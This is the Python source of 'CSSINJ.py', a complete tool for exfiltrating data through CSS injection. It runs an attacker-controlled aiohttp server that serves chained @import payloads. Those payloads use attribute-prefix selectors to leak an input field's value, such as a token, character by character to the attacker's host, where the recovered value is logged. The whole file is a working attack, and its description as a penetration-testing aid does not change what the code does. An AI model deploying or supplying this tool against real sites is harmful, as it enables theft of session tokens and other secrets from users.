import argparse
import string
import time
import random
import urllib.parse
from aiohttp import web
import asyncio


class CssInjector:
    def __init__(self):
        self.parser = self.set_parser()
        self.token = ""
        self.event = asyncio.Event()

    def log(self, status: str, message: str):
        if status == "ok":
            print(f"\33[0;32m[✓]\033[0m {message}")
        elif status == "info":
            print(f"\33[0;36m[ⓘ]\033[0m {message}")
        elif status == "error":
            print(f"\33[0;31m[✗]\033[0m {message}")

    def set_parser(self):
        parser = argparse.ArgumentParser(
            prog="CSSINJ.py",
            description="A tool for exfiltrating sensitive information using CSS injection, designed for penetration testing and web application security assessment.",
            epilog="A tool by \33[0;36mAsako\033[0m",
        )
        parser.add_argument(
            "-H", "--hostname", required=True, help="Attacker hostname or IP address"
        )
        parser.add_argument(
            "-p", "--port", required=True, type=int, help="Port number of attacker"
        )
        parser.add_argument(
            "-i",
            "--identifier",
            required=True,
            help="CSS identifier (CSS selector) to extract data",
        )
        return parser

    def start(self):
        print(
            "\33[1m  _____   _____   _____  _____  _   _       _     _____  __     __\n / ____| / ____| / ____||_   _|| \\ | |     | |   |  __ \\ \\ \\   / /\n| |     | (___  | (___    | |  |  \\| |     | |   | |__) | \\ \\_/ /\n| |      \\___ \\  \\___ \\   | |  | . ` | _   | |   |  ___/   \\   /\n| |____  ____) | ____) | _| |_ | |\\  || |__| | _ | |        | |\n \\_____||_____/ |_____/ |_____||_| \\_| \\____/ (_)|_|        |_|\033[0m\n"
        )
        args = self.parser.parse_args()

        self.identifier = args.identifier
        self.hostname = args.hostname
        self.port = args.port
        self.app = web.Application()
        self.app.middlewares.append(self.dynamic_router_middleware)
        web.run_app(self.app, port=self.port, print=self.log("ok", f"Attacker's server started on {args.hostname}:{args.port}"))
        


    def generate_injection(self):
        stri = f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}');\n"
        stri += f'{self.identifier}[value={repr(self.token)}]{"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/end") !important;}}'
        stri += f"""{"".join(map(lambda x: f'*:has({self.identifier}[value^={repr(self.token+x)}]){"".join([":first-child" for i in range(len(self.token))])}{{background: url("//{self.hostname}:{self.port}/valid?token={urllib.parse.quote_plus(self.token+x)}") !important;}}\n', "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"))}"""
        return stri

    async def handle_start(self, request):
        self.log("ok", f"Connection from {request.remote}")
        self.event.set()
        return web.Response(
            text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
            content_type="text/css",
        )

    async def handle_end(self, request):
        self.log("ok", f"The token is : {self.token}")
        return web.Response(text="End.", status=503)

    async def handle_next(self, request):
        if not self.event.is_set():
            await self.event.wait()
        self.event.clear()
        return web.Response(text=self.generate_injection(), content_type="text/css")

    async def handle_valid(self, request):
        self.event.set()
        self.token = request.query.get("token")
        self.log("info", f"Token is {self.token}")
        return web.Response(text="ok.", content_type="image/x-icon")

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith("/start"):
                return await self.handle_start(request)
            elif path.startswith("/next"):
                return await self.handle_next(request)
            elif path.startswith("/valid"):
                return await self.handle_valid(request)
            elif path.startswith("/end"):
                return await self.handle_end(request)

            return web.Response(text="404: Not Found", status=404)

        return middleware_handler


if __name__ == "__main__":
    CssInjector().start()
